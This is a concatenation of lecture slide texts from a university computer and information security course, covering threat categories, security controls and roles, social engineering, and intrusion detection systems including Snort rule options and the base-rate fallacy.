Man-in-the-Middle (e.g., SSL)
Manipulation of data
Intrusion
Hijacking of hardware (supply chain attack, stealing computer resources)
Botnets (spam, DDoS, spyware, phishing)
Social engineering (phishing, Trojan horse…)
Denial-of-Service
Redirecting traffic destined for one website to another bogus website (browser of victim or DNS server manipulation)
Passive (hard to detect) vs. active attacks
Unauthorized disclosure
Telephony attacks “blue boxing” (or phreaking)
Near‐field, Zigbee etc.
Scada attacks
etc … (will not end and always will come up something new …)


87

88
Threats and consequences
88

89
Scope of Computer Security
89

90
89

The assets of a computer system can be categorized as hardware, software, data,
and communication lines and networks. In this subsection, we briefly describe these
four categories and relate these to the concepts of integrity, confidentiality, and
availability introduced in Section 1.1 (see Figure 1.3 and Table 1.3 ).


Countermeasures
Means used to deals with security attacks
prevent
detect
recover
Goal: minimize risk to an asset
May introduce new vulnerabilities
Residual vulnerability

90

91
90

In the context of security, our concern is with the vulnerabilities of system
resources. [NRC02] lists the following general categories of vulnerabilities of a
computer system or network asset:

• It can be corrupted , so that it does the wrong thing or gives wrong answers.
For example, stored data values may differ from what they should be because
they have been improperly modified.

• It can become leaky . For example, someone who should not have access to
some or all of the information available through the network obtains such
access.

• It can become unavailable or very slow. That is, using the system or network
becomes impossible or impractical.

These three general types of vulnerability correspond to the concepts of integrity,
confidentiality, and availability, enumerated earlier in this section.

Corresponding to the various types of vulnerabilities to a system resource are
threats that are capable of exploiting those vulnerabilities. A threat represents a
potential security harm to an asset. An attack is a threat that is carried out (threat
action) and, if successful, leads to an undesirable violation of security, or threat
consequence. The agent carrying out the attack is referred to as an attacker, or
threat agent . We can distinguish two types of attacks:

• Active attack: An attempt to alter system resources or affect their operation.

• Passive attack: An attempt to learn or make use of information from the
system that does not affect system resources.

We can also classify attacks based on the origin of the attack:

• Inside attack: Initiated by an entity inside the security perimeter (an “insider”).
The insider is authorized to access system resources but uses them in a way not
approved by those who granted the authorization.

• Outside attack: Initiated from outside the perimeter, by an unauthorized or
illegitimate user of the system (an “outsider”). On the Internet, potential
outside attackers range from amateur pranksters to organized criminals, international
terrorists, and hostile governments.
Examples of threats
Table 1.3    Computer and Network Assets, with Examples of Threats. 
91

92

HARDWARE A major threat to computer system hardware is the threat to
availability. Hardware is the most vulnerable to attack and the least susceptible to
automated controls. Threats include accidental and deliberate damage to equipment
as well as theft. The proliferation of personal computers and workstations and the
widespread use of LANs increase the potential for losses in this area. Theft of
CD-ROMs and DVDs can lead to loss of confidentiality. Physical and administrative
security measures are needed to deal with these threats.

SOFTWARE Software includes the operating system, utilities, and application
programs. A key threat to software is an attack on availability. Software, especially
application software, is often easy to delete. Software can also be altered or
damaged to render it useless. Careful software configuration management, which
includes making backups of the most recent version of software, can maintain high
availability. A more difficult problem to deal with is software modification that
results in a program that still functions but that behaves differently than before,
which is a threat to integrity/authenticity. Computer viruses and related attacks fall
into this category. A final problem is protection against software piracy. Although
certain countermeasures are available, by and large the problem of unauthorized
copying of software has not been solved.

DATA Hardware and software security are typically concerns of computing center
professionals or individual concerns of personal computer users. A much more
widespread problem is data security, which involves files and other forms of data
controlled by individuals, groups, and business organizations.
Security concerns with respect to data are broad, encompassing availability,
secrecy, and integrity. In the case of availability, the concern is with the destruction
of data files, which can occur either accidentally or maliciously.

The obvious concern with secrecy is the unauthorized reading of data files or
databases, and this area has been the subject of perhaps more research and effort
than any other area of computer security. A less obvious threat to secrecy involves
the analysis of data and manifests itself in the use of so-called statistical databases,
which provide summary or aggregate information. Presumably, the existence of
aggregate information does not threaten the privacy of the individuals involved.
However, as the use of statistical databases grows, there is an increasing potential
for disclosure of personal information. In essence, characteristics of constituent
individuals may be identified through careful analysis. For example, if one table
records the aggregate of the incomes of respondents A, B, C, and D and another
records the aggregate of the incomes of A, B, C, D, and E, the difference between
the two aggregates would be the income of E. This problem is exacerbated by the
increasing desire to combine data sets. In many cases, matching several sets of data
for consistency at different levels of aggregation requires access to individual units.
Thus, the individual units, which are the subject of privacy concerns, are available at
various stages in the processing of data sets.

Finally, data integrity is a major concern in most installations. Modifications
to data files can have consequences ranging from minor to disastrous.
91
Passive and Active Attacks

Passive attacks attempt to learn or make use of information from the system but does not affect system resources
eavesdropping/monitoring transmissions
difficult to detect
emphasis is on prevention rather than detection
two types:
release of message contents
traffic analysis
Active attacks involve modification of the data stream
goal is to detect them and then recover
four categories:
masquerade
replay
modification of messages
denial of service
92

93
92

COMMUNICATION LINES AND NETWORKS 

Network security attacks can be classified
as passive attacks and active attacks . A passive attack attempts to learn or make
use of information from the system but does not affect system resources. An active
attack attempts to alter system resources or affect their operation.

Passive attacks are in the nature of eavesdropping on, or monitoring of,
transmissions. The goal of the attacker is to obtain information that is being transmitted.
Two types of passive attacks are release of message contents and traffic
analysis.

The release of message contents is easily understood. A telephone conversation,
an electronic mail message, and a transferred file may contain sensitive or
confidential information. We would like to prevent an opponent from learning the
contents of these transmissions.

A second type of passive attack, traffic analysis , is subtler. Suppose that we
had a way of masking the contents of messages or other information traffic so that
opponents, even if they captured the message, could not extract the information
from the message. The common technique for masking contents is encryption. If we
had encryption protection in place, an opponent might still be able to observe the
pattern of these messages. The opponent could determine the location and identity
of communicating hosts and could observe the frequency and length of messages
being exchanged. This information might be useful in guessing the nature of the
communication that was taking place.

Passive attacks are very difficult to detect because they do not involve any
alteration of the data. Typically, the message traffic is sent and received in an
apparently normal fashion and neither the sender nor receiver is aware that a
third party has read the messages or observed the traffic pattern. However, it is
feasible to prevent the success of these attacks, usually by means of encryption.
Thus, the emphasis in dealing with passive attacks is on prevention rather than
detection.

Active attacks involve some modification of the data stream or the creation
of a false stream and can be subdivided into four categories: replay, masquerade,
modification of messages, and denial of service.

Replay involves the passive capture of a data unit and its subsequent retransmission
to produce an unauthorized effect.

A masquerade takes place when one entity pretends to be a different entity. A
masquerade attack usually includes one of the other forms of active attack. For example,
authentication sequences can be captured and replayed after a valid authentication
sequence has taken place, thus enabling an authorized entity with few privileges
to obtain extra privileges by impersonating an entity that has those privileges.

Modification of messages simply means that some portion of a legitimate
message is altered, or that messages are delayed or reordered, to produce an
unauthorized effect. For example, a message stating, “Allow John Smith to read
confidential file accounts” is modified to say, “Allow Fred Brown to read confidential
file accounts.”

The denial of service prevents or inhibits the normal use or management of
communications facilities. This attack may have a specific target; for example, an
entity may suppress all messages directed to a particular destination (e.g., the security
audit service). Another form of service denial is the disruption of an entire network,
either by disabling the network or by overloading it with messages so as to degrade
performance.

Active attacks present the opposite characteristics of passive attacks. Whereas
passive attacks are difficult to detect, measures are available to prevent their
success. On the other hand, it is quite difficult to prevent active attacks absolutely,
because to do so would require physical protection of all communications facilities
and paths at all times. Instead, the goal is to detect them and to recover from any
disruption or delays caused by them. Because the detection has a deterrent effect, it
may also contribute to prevention.
Who are the bad guys?
Elite hackers
Virus writers and releasers
Script kiddies: limited but numerous
Criminals - growing rapidly
Employees, Consultants, and Contractors
White hats: use their hacking ability for defensive purpose
Ethical hacker: former black hat, white hat, consulting company; using his skills for defensive purposes
Cyberterrorism and Cyberwar
Hacktivism: hacking for a cause (e.g., social or political agenda)
Virtual gangs: a group of hackers that each one of them specializes in different platform
93

94
Goals of information security
Identification of the organization’s assets
Making sure that important assets (data\information, hardware, software, network) of the organization are protected
Allowing the organization to run its business with as less disruptions as possible
Continuous and iterative activity of integrating, implementing, improving and validating security mechanisms to allow running business process
Complying with information security policies, rules, regulations
94

95
Computer security strategy – how do we get it done?
Specification/policy
what is the security scheme supposed to do?
consider the value of the assets; vulnerabilities; potential threats and the likelihood of attacks
“Ease of use versus security”
“Cost of security versus cost of failure and recovery”
Risk management
Implementation/mechanisms
how does it do it?
prevention, detection, response, recovery
Correctness/assurance
does it really work?
assurance, evaluation
95

96
95


Security plan elements
Governance
Policy
Asset identification & classification
Risk management program
Intelligence program
Audit & compliance program
Incident management
Education & awareness program
Technical security (systems, communication)
Access control
Identification and Authentication
Configuration management
Contingency planning
Monitoring
Physical security
Employees/personnel
Forensics
96

97
ת"י 7799 – ניהול אבטחת מידע
1. קביעת מדיניות אבטחת מידע
2. ארגון אבטחת מידע
3. סיווג ובקרה של נכסי הארגון
4. אבטחת עובדים
5. אבטחה פיזית וסביבתית
6. ניהול תקשורת ותפעול
7. בקרת גישה
8. פיתוח ותחזוקה של מערכות
9. ניהול המשכיות עסקית
10.תאימות

97

98
Security technologies used
Implementing 
mature, low cost
solutions
98

99
98


Key drivers
Client requirement
Legal, regulations
Potential exposure
Common practice

Security vs. privacy
Budget
Transparency
99

100
Who is responsible for security
Executive management\CEO ?

IT department\CTO ?

IT security stuff ?

Everyone! – all employees and stakeholders of the organization


100

101
Who is responsible for security
101

102
Role of security in today’s world
Top management
Endorse and lead information security
Chief Information Security Officer (CISO)
Responsible for the design and implementation of a comprehensive security plan
Information security implementer
Implement, install, support , maintain security tools
The “hands-on” function
Sometime the network administrator is also the IS implementer
Deep understanding in Windows, Linux, databases, network security and also in specific products (Symantec, Cisco …)
102

103


מנהל אבטחת מידע ארגוני (CISO) אחראי על גיבושה ומימושה של תוכנית אבטחת המידע שמטרתה להבטיח שנכסי המידע הארגוניים מוגנים כנדרש. במסגרת זו, מנהל אבטחת המידע אחראי על זיהוי, ניתוח וניהול של סיכוני אבטחת מידע באופן העונה על דרישות העסק והרגולציה. התפקיד מצריך חזון ומנהיגות בשילוב יכולות טובות בתחום הניהול הטכנולוגי והעסקי. ה-CISO פועל ביחד עם הגורמים העסקיים בארגון לצורך גיבוש מדיניות וסטנדרטים של אבטחת מידע. הוא גם מפקח על כלל פעילויות ניהול הסיכונים ב-IT.
ה-CISO משמש כאחראי על כלל התהליכים והפעילויות הכרוכים בשמירה על זמינות, כלילות (integrity) וחשאיות המידע של העסק, של לקוחותיו, של שותפיו העסקיים ושל עובדיו. כל זאת בהתאם למדיניות אבטחת המידע הארגונית. גורם מפתח בתפקידו של ה-CISO טמון ביכולתו לעבוד עם ההנהלה הבכירה בארגון בכדי להגדיר, במשותף, את רמות הסיכון המקובלות על העסק. מנהל אבטחת המידע חייב להיות בעל ידע רחב בסביבה העסקית וחייב לוודא שמערכות המידע מנוהלות ופועלות באופן מאובטח.
באופן אידיאלי, מנהל אבטחת המידע משמש כמתווך בין אנשים ותהליכים, מנהיג בעל מחשבה ויכולת לפתרון בעיות, יועץ אפקטיבי, בעל יכולות רחבות בתחום אבטחת המידע ובעל ניסיון של 8-10 שנים בניהול ואבטחת מידע.
תחומי אחריות
פיתוח, יישום וניטור של תוכנית מקיפה ופרטנית לאבטחת המידע וניהול סיכונים בהיבטי זמניות, כלילות וחשאיות המידע הארגוני.
ניהול גוף האבטחה של הארגון, במתווי דיווח ישירים ועקיפים, לרבות גיוס, אימון, פיתוח והערכת ביצועי עובדים.
פיתוח, תקשור ווידוא של מימוש מדינות ונוהלי אבטחת המידע של הארגון.
גיבוש וניהול תקציבי אבטחת מידע.
יצירה וניהול של תוכנית מודעות והדרכת אבטחת מידע לכלל עובדי הארגון, ספקים חיצוניים ומשתמשי המערכות.
עבודה מול היחידות העסקיות השונות בכדי לנתח סיכוני אבטחת מידע, לזהות רמות מקובלות של סיכון ולמסד תפקידים ותחומי אחריות בתחום סיווג והגנה על המידע.
לספק ייעוץ להנהלה הבכירה במגוון רחב של סטנדרטים ופרקטיקות מקובלות בתחום אבטחת המידע.
לספק הנחיה טקטית ואסטרטגית בתחום אבטחת המידע לפרויקטי IT, לרבות הערכה והמלצה על שילוב בקרות טכניות.
תיאום מול גופי התכנון ב-IT במטרה לוודא ששיקולי אבטחת מידע נלקחים בחשבון באסטרטגיית הבניה והתשתית של מערכות המידע בארגון.
תיאום פרויקטים של אבטחה וניהול סיכונים מול גוף ה-IT והגורמים העסקיים הרלבנטיים.
ווידוא קיום דרישות החוק, הרגולציה והמדיניות הנוגעים לאבטחת מידע.
תיאום וקישור בין גוף האבטחה לגופי הממשל התאגידי, הביקורת, כוח האדם, היועצים המשפטיים וכיו"ב.
יצירה וניהול של תהליך הערכת סיכוני אבטחת מידע, לרבות דיווח ופיקוח על הפעולות המתקנות כתוצאה מזיהוי מפגעי אבטחה.
ניהול אירועי אבטחת מידע.
תיאום השימוש במשאבים חיצוניים הקשורים בתוכנית האבטחה, לרבות ניהול מו"מ, גיבוש הסכמים ותנאי עסקות לאספקת שירותים או מוצרים בתחום אבטחת מידע.
פיתוח מדיניות אפקטיבית להתאוששות מאסון, תיאום של יצירת תוכניות ונוהלי התאוששות, בכדי להבטיח המשכיות עסקית במקרה של אסון.
פיתוח מדדים רלבנטיים להערכת היעילות והאפקטיביות של תוכנית האבטחה, בכדי לוודא הקצאה נכונה של משאבים ופיתוח הבשלות של התוכנית.
התאמה של האבטחה לצרכי העסק ויצירת תקשורת עם ההנהלה באמצעות יצירת צוות היגוי בכיר לאבטחת מידע.


102
Role of security in today’s world
Information security architect\engineer
Design the security solution that should protect the organization against its risks
Instruct the IS implementers
Information security auditor
Auditing of security products, processes, policies etc.
Penetration tester\Ethical Hacker
Hacking to systems and assets
Detecting vulnerabilities
Forensics investigator
103

104


103
Designing a security system

What goals do we want to achieve?
Does the system focus on the data, operations or the users of the system?
What level should the security system operate from? Should it be at the level of hardware, operating system or applications package?
Should it be simple or sophisticated?
In a distributed system, should the security be centralized or spread?
How do you secure the levels below the level of the security system?
104

105
Physical measures: CCTV, guard, fences, locks, CD-ROM\USB removal, fire alarms, controlling individual access to the facility…

Administrative measures: developing and
publishing policies, standards, procedures
and guidelines, screening and background
checks, awareness, risk assessment, 
audit, training…

Technical (logical) measures: access
control mechanisms to systems, passwords,
firewalls, anti-virus, IDS, VPNs, configuration 
managements, backup…
Types of security controls and solutions
105

106
Categories
	Administrative	Technical	Physical
Directive	Policy	Warning/ instructive banner	Security guard
Deterrent	Demotion	Audit logs	Security guard
Preventive	Information classification	Encryption / access control	Fences
Detective	Investigation	IDS	Motion detectors
Corrective	Termination	Anti-virus	Fire extinguisher
Recovery	DRP	Backups	Rebuild
Compensating	Supervision	Keystroke dynamic	Layered fences
106

107
Security services
Authentication
assuring that a communication is from the source that it claims to be from
must assure that the connection is not interfered with by a third party masquerading as one of the two legitimate parties
Data origin authentication

Access control
the ability to limit and control the access to host systems and applications via communications links
107

108
Security services
Nonrepudiation
prevents either sender or receiver from denying a transmitted message
receiver can prove that the alleged sender in fact sent the message
the sender can prove that the alleged receiver in fact received the message
108

109
Security services
Data confidentiality
the protection of transmitted data from passive attacks
protects the traffic flow from analysis
this requires that an attacker not be able to observe the source and destination, frequency, length, or other characteristics of the traffic on a communications facility
109

110
Security services
Data Integrity
can apply to a stream of messages, a single message, or selected fields within a message
protection against message modification only
assures that messages are received as sent, with no duplication, insertion modification, reordering, or replays
destruction of data is also covered under this service
Availability
a service that protects a system to ensure its availability
110

111
Assurance and Evaluation
assurance
the degree of confidence one has that the security measures work as intended to protect the system and the information it processes
encompasses both system design and system implementation
evaluation
process of examining a computer product or system with respect to certain criteria
involves testing and formal analytic or mathematical techniques
111

112

Those who are “consumers” of computer security services and mechanisms (e.g.,
system managers, vendors, customers, and end users) desire a belief that the security
measures in place work as intended. That is, security consumers want to feel that the
security infrastructure of their systems meet security requirements and enforce security
policies. These considerations bring us to the concepts of assurance and evaluation.

The NIST Computer Security Handbook [NIST95] defines assurance as the
degree of confidence one has that the security measures, both technical and operational,
work as intended to protect the system and the information it processes. This
encompasses both system design and system implementation. Thus, assurance deals
with the questions, “Does the security system design meet its requirements?” and
“Does the security system implementation meet its specifications?”

Note that assurance is expressed as a degree of confidence, not in terms of a formal
proof that a design or implementation is correct. With the present state of the art,
it is very difficult if not impossible to move beyond a degree of confidence to absolute
proof. Much work has been done in developing formal models that define requirements
and characterize designs and implementations, together with logical and mathematical
techniques for addressing these issues. But assurance is still a matter of degree.

Evaluation is the process of examining a computer product or system with
respect to certain criteria. Evaluation involves testing and may also involve formal
analytic or mathematical techniques. The central thrust of work in this area is
the development of evaluation criteria that can be applied to any security system
(encompassing security services and mechanisms) and that are broadly supported
for making product comparisons.
111
Social engineering
Human are usually the weakest link in the security chain
Social engineering is the human side of breaking into a corporate network
Acquisition of sensitive information or inappropriate access privileges by an outsider based upon inappropriate trust relationships with insiders
The goal is to cone the victim into providing valuable information
112

113
80%-95% of the attacks exploits human vulnerabilities
113
BGU Cyber Security Research Center

114


113
Social engineering
Human are usually the weakest link in the security chain
Social engineering is the human side of breaking into a corporate network
Acquisition of sensitive information or inappropriate access privileges by an outsider based upon inappropriate trust relationships with insiders
The goal is to cone the victim
into providing valuable information
Steps
Information gathering
Development of relationship
Exploiting of relationship
Execution to achieve objective
114

115
Social engineering - types
Human-based - person-to-person interaction in order to retrieve the desired information
Impersonation
Posing as important user
Third party authorization
Masquerading
Dumpster Diving (= Trashing) and shoulder surfing
 Computer-based
Having computer software that attempts to retrieve desired information
Mail or Instant Messaging (IM) attachments
Pop up windows
Websites
Spam mail
CD / DVD/ USB …
115

116
Checkpoint analysis of Gooligan: 1m Google accounts compromised (30/11/16)
The malware code been found in
dozens of legitimate-looking apps 
on third-party app stores which 
offer free versions of paid application
Gooligan-infected apps are also 
installed using phishing scams
After Gooligan is installed  he collect data about the device and downloads a rootkit that takes advantage of well-known Android 4 and 5 (old versions) exploits
These exploits still plague many devices today because the patches were never installed by the user
BGU Cyber Security Research Center
116

117
Information security
An on going process
Prevention
Monitoring and detection
Response
Emergency – carry out BCP
Recovery
Forensics \ investigation
Updating



117

Auditing,
Periodic testing

118
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\מבוא\Intrusion-detectionי\CompNetSec8_IDS.pdf </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
Computer & Information Security (3-721-460-1)
Intrusion Detection
Dept. of Software and Information Systems 
Engineering, Ben-Gurion University
Prof. Yuval Elovici, Dr. Asaf Shabtai
{elovici, shabtaia}@bgu.ac.il
Spring, 2019
Intruders
• two most publicized threats to security 
are malware and intruders
• generally referred to as a hacker or 
cracker
• An unauthorized individual who penetrates 
a system to exploit a legitimate user 
account (masquerader)
• legitimate user who misuses privileges
• Seize supervisory control to evade auditing 
and access controls or to suppress audit 
collection
Firewalls and Intrusion 
Prevention Systems
• effective means of protecting LANs
• Internet connectivity essential
– for organization and individuals
– but creates a threat
• could secure workstations and servers
• also use firewall as perimeter defence
– single choke point to impose security 
Intrusion detection
• Activities that violate the security policy of a system 
are often called intrusions
• Intrusion detection is the process used to identify 
intrusions and/or intrusion attempts
• Intruder problem led to establishment of computer 
emergency response teams (CERTs)
• IDS vs. IPS
4
Examples of Intrusion
• accessing resources without authorization
• remote root compromise
• web server defacement
• guessing / cracking passwords
• copying databases containing sensitive data
• viewing sensitive data without 
authorization
• running a packet sniffer
• denial of service
• …
Goals of the IDS
• Answer the questions:
– What happened?
– Who was affected? Who was the attacker?
– How are they affected? How did the intrusion 
occur?
– Where and when did the intrusion originate?
– Why were we attacked?
• ID aims to positively identify all attacks 
and negatively identify all non-attacks
7
Hacker Behavior - example
• select target
• map network for accessible services 
• identify potentially vulnerable services 
• brute force (guess) passwords
• install remote administration tool 
• wait for admin to log on and capture 
password
• use password to access remainder of 
network
Criminal Enterprise, APT, 
Insiders
• make their activities harder to detect
• among most difficult to detect and prevent
• use Trojan horses to leave back doors for re-
entry
• do not stick around until noticed
• make few or no mistakes
• employees have access & systems knowledge
• IDS / IPS may help but also need:
– least privilege, monitor logs, strong authentication, 
termination process to block access & mirror data
Definitions (RFC 2828 – Internet 
Security Glossary)
• Security Intrusion: A security event, or a 
combination of multiple security events, that 
constitutes a security incident in which an 
intruder gains, or attempts to gain, access to a 
system (or system resource) without having 
authorization to do so.
• Intrusion Detection: A security service that 
monitors and analyzes system events for the 
purpose of finding, and providing real-time or 
near real-time warning of, attempts to access 
system resources in an unauthorized manner.
Taxonomy
• Architecture
– Host-based
– Network-based
• inline vs. passive
– Distributed
– Hybrid
• Analysis technique
– Misuse detection
– Anomaly detection
• Time aspect
– Real-time
– Off-line
• Information 
source/type
– System calls
– System measurements 
and events
– Network traffic
– Application logs
– Sensor alerts
– File/directory access
– Native vs. specific 
audit
• Detection vs. 
prevention
12
Taxonomy
• Aggregation
– Packet vs. session
– Application vs. system
– User
• Analysis technique
– Statistics
– Time series / state modeling
– Association rules
– Instance-based learning
– Comparing graphs
13
Components
• sensors - collect data
• analyzers - determine if intrusion has occurred
• user interface - view output or control system behavior
• Intrusion detection exchange format (The Intrusion 
Detection Message Exchange Format (IDMEF) – RFC 
4765):
– “The purpose of the Intrusion Detection Working Group is to 
define data formats and exchange procedures for sharing 
information of interest to intrusion detection and response 
systems, and to management systems which may need to 
interact with them.”
14
IDS Principles
• assume intruder behavior differs from legitimate 
users
• overlap in behaviors causes problems
• false positives
• false negatives
IDS Requirements
• run continually
• be fault tolerant
• resist subversion
• impose a minimal overhead on system
• configured according to system security 
policies 
• adapt to changes in systems and users
• scale to monitor large numbers of systems
• provide graceful degradation of service
• allow dynamic reconfiguration
Measures that may be used for 
Intrusion Detection
Measure Model Type of Intrusion Detected 
Login and Session Activity 
Login frequency by day and 
time  
Mean and standard deviation Intruders may be likely to log 
in during off-hours. 
Frequency of login at different 
locations  
Mean and standard deviation Intruders may log in from a 
location that a particular user 
rarely or never uses. 
Time since last login  Operational Break-in on a "dead" account. 
Elapsed time per session Mean and standard deviation Significant deviations might 
indicate masquerader. 
Quantity of output to location Mean and standard deviation Excessive amounts of data 
transmitted to remote 
locations could signify 
leakage of sensitive data. 
Session resource utilization Mean and standard deviation Unusual processor or I/O 
levels could signal an intruder. 
Password failures at login Operational Attempted break-in by 
password guessing. 
Failures to login from 
specified terminals 
Operational Attempted break-in. 
Command or Program Execution Activity 
Execution frequency Mean and standard deviation May detect intruders, who are 
likely to use different 
commands, or a successful 
penetration by a legitimate 
user, who has gained access to 
privileged commands. 
Program resource utilization Mean and standard deviation An abnormal value might 
suggest injection of a virus or 
Trojan horse, which performs 
side-effects that increase I/O 
or processor utilization. 
Execution denials Operational model May detect penetration 
attempt by individual user 
who seeks higher privileges. 
File Access Activity 
Read, write, create, delete 
frequency 
Mean and standard deviation Abnormalities for read and 
write access for individual 
users may signify 
masquerading or browsing. 
Records read, written Mean and standard deviation Abnormality could signify an 
attempt to obtain sensitive 
data by inference and 
aggregation. 
Failure count for read, write, 
create, delete 
Operational May detect users who 
persistently attempt to access 
unauthorized files. 
 
Host-Based IPS
• identifies attacks using both:
– signature techniques
• malicious application packets
– anomaly detection techniques
• behavior patterns that indicate malware
• can be tailored to the specific platform
– e.g. general purpose, web/database server specific
• can also sandbox applets to monitor behavior
• may give desktop file, registry, I/O protection
Network-Based IPS
• inline NIDS that can discard packets or 
terminate TCP connections
• uses signature and anomaly detection
• may provide flow data protection
– monitoring full application flow content
• can identify malicious packets using:
– pattern matching, stateful matching, protocol 
anomaly, traffic anomaly, statistical anomaly
• cf. SNORT inline can drop/modify packets
History of IDS
An Intrusion Detection Model [Dorothy Denning, 1983]
• First Intrusion Detection Expert System (IDES)
• Assumption – exploiting a system’s vulnerability involves 
abnormal use of the system
• Intrusion detection model
– Subjects – initiate actions in the target system; user, 
process, system, groups
– Objects – files, programs, messages, records, printers,…
– Audit records
– Profiles
– Anomaly records
– Activity rules
• Monitoring standard operations: logins, commands, 
program executions, file/device access etc.
20
History of IDS
An Intrusion Detection Model [Dorothy Denning, 1983]
• Audit records
– 6-tuples representing actions performed by subject on object
<subject, action, object, exception-condition, resource-usage, timestamp>
– action – login, read, execute…
– exception-condition – raised by the system (e.g. write violation)
– resource-usage – CPU, memory…
• Profiles – using metrics such as: event counter, between interval 
timer, resource measure
– operational model (e.g. threshold)
– confidence interval
– multivariate model (e.g. correlations)
– state transitions (e.g. Markov models)
– time series
21
History of IDS
An Intrusion Detection Model [Dorothy Denning, 1983]
• Profile – contains info that identify the 
statistical model of a random variable
– Types of profiles: login frequency, location 
frequency, last login, session time, execution 
frequency, program resources, exec denied, 
read/write frequencies…
22
Additional IDSs in literature
• Learning patterns from Unix process 
execution traces
[Lee and Stolfo, 1997]
– extracting system calls (sliding window) 
from normal and abnormal executions
23
Additional IDSs in literature
• ADAM: Detecting Intrusions by Data Mining [Barbara et 
al. 2001]
• Combination of Association Rule and Classification
– Uses connections as the basic granule
• USTAT [1992] and NETSTAT [1998]
– real-time intrusion detection
system for UNIX
24
Distributed Host-Based IDS
NIDS Deployment
PAYL - payload-based NIDS
Wang, Stolfo 2004
• PAYL: a packet payload-based anomaly detection sensor 
• Proposed efficient means of modeling normal payload data
• Basic assumption: new zero-day attack will have content 
data never before seen by the victim host
• Designed to detect and stop the very first occurrences of 
an attack that exhibits anomalous content
• Incremental update to changing or drifting environments
27
PAYL - payload-based NIDS
Length conditioned n-gram payload model
• Each application has its own special 
protocol and thus has its own payload type
– SSH payload to port 22 should be encrypted 
 uniform distribution
– FTP payload to port 21 should be primarily 
printable characters entered by a user
– Larger payloads are more likely to have non-
printable characters (pictures, video clips or 
executable files etc.)
28
PAYL - payload-based NIDS
Length conditioned n-gram payload model
• For the payload of some inbound or outbound port, the feature 
vector is
– Relative frequency count of each 1-gram (average frequency of each 
ASCII character 0-255)
– Standard deviation of each frequency
29
PAYL - payload-based NIDS
Length conditioned n-gram payload model
• Training
– create model Mij where avg byte frequency and the std of each 
byte’s frequency (length i; port j)
• Detection
– for each incoming payload compute its byte value distribution and 
compare against model Mij;
– if the distribution is significantly different from the norm, the 
packet is flagged as anomalous and generates an alert
30
Monitoring smartphones
31
Graphical User Interface
Feature 
Manager
Loggers
Communication layer
Threat 
Weighting Unit
Application Level
Operating System
Scheduling
Memory
Keyboard
Network
Hardware
Power
SQLite
Feature Extractors
Config
Manager
Operation 
Mode Manager
Alert 
Manager
Rule-based
Anomaly 
Detector
Classifier
KBTA
Processors
Alert 
Handler
Agent Service
Processor 
Manager
Linux 
Kernel
Application 
Framework
Control Center
Monitoring smartphones
• Cost-sensitive feature selection
32
Anomaly-Based NIDS
• Traditional Approach (passive)
• Analyze features of the network’s production traffic 
(background traffic)
– Packets payload information
– Network events
– Network flows
– Management Information Base (MIB)
• Main disadvantages
• The production traffic varies immensely, even when the network 
is not under attack
• The NIDS has to process all the production traffic flowing 
through it
33
Passive NIDS usually end up having
Low attack detection rate
High false alarm rate
But Why? Answer: SNR!
34
Classification 
Threshold
Active NIDS
• A system that detects anomalies using a self-
traffic
– The self traffic can be generated according to a known 
probability
• Main advantage over passive NIDS
• Self-traffic is characterized by a very low 
variability 
– Self-traffic features’ have a very high S.N.R. (good)
– Crucial for training a sound anomaly detection classifier
35
Network Node
NIDS Agent
Probe Packet
Sensor
S10
S3S2S1
S4
S5
S6
S8
S9
S11
S12
S13
S14
S7
Central 
Detection 
Server
ClassifierConcept Demonstration
36
What’s Snort?
• Lightweight (in terms of memory and CPU) open 
source network intrusion detection system (NIDS)
• Real-time packet capture and rule analysis
• Easily deployed on nodes
• Uses a simple/flexible rule-based language
• Each rule consists of a fixed header and zero or more 
options
Snort rules 
meta-data 
msg    Defines the message to be sent when a packet generates an event. 
 
reference    Defines a link to an external attack identification system, which provides additional 
information. 
 
classtype     Indicates what type of attack the packet attempted. 
payload 
content     Enables Snort to perform a case-sensitive search for specific content (text and/or 
binary) in the packet payload. 
 
depth     Specifies how far into a packet Snort should search for the specified pattern. Depth 
modifies the previous content keyword in the rule. 
 
offset     Specifies where to start searching for a pattern within a packet. Offset modifies the 
previous content keyword in the rule. 
 
nocase     Snort should look for the specific pattern, ignoring case. Nocase modifies the previous 
content keyword in the rule. 
non-payload 
ttl     Check the IP time-to-live value. This option was intended for use in the detection of 
traceroute attempts. 
 
id     Check the IP ID field for a specific value. Some tools (exploits, scanners and other odd 
programs) set this field specifically for various purposes, for example, the value 31337 is very 
popular with some hackers. 
 
dsize     Test the packet payload size. This may be used to check for abnormally sized packets. In 
many cases, it is useful for detecting buffer overflows. 
 
flags     Test the TCP flags for specified settings. 
 
seq     Look for a specific TCP header sequence number. 
 
icmp-id     Check for a specific ICMP ID value. This is useful because some covert channel 
programs use static ICMP fields when they communicate. This option was developed to detect 
the stacheldraht DDoS agent. 
 
post-detection 
logto     Log packets matching the rule to the specified filename. 
 
session     Extract user data from TCP Sessions. There are many cases where seeing what users 
are typing in telnet, rlogin, ftp, or even web sessions is very useful. 
 
 
Snort rule options
Rule examples
One of the Main Challenges in Security – The “Base-Rate Fallacy”
(The Base-Rate Fallacy and the Difficulty of Intrusion 
Detection, Axellson, 2000)
• In order for security applications to be “effective”, 
they must maintain a very low false-positive rate
• In real-world scenarios, malicious code\packets are 
less than a fraction of 1% of the population
• In these cases, even a 99% classification rate might 
prove unacceptable…
• For example – a medical test which is 99% accurate 
for a disease that happens for 1 out of 100,000 
people
One of the Main Challenges in Security – The “Base-Rate Fallacy”
(The Base-Rate Fallacy and the Difficulty of Intrusion Detection, 
Axellson, 2000)
• In order for security applications to be “effective”, they must 
maintain a very low false-positive rate
• In real-world scenarios, malicious code\packets are less than a 
fraction of 1% of the population
• In these cases, even a 99% classification rate might prove 
unacceptable…
• For example – a medical test which is 99% accurate for a 
disease that happens for 1 out of 100,000 people
– Even if you tested positive, your chances of a TP < 1%
• This has serious implications for experiment design and 
algorithm performance
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\מבוא\Malware\Malware.pdf </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
Computer & Information Security (3-721-460-1)
Malware
Dept. of Software and Information Systems 
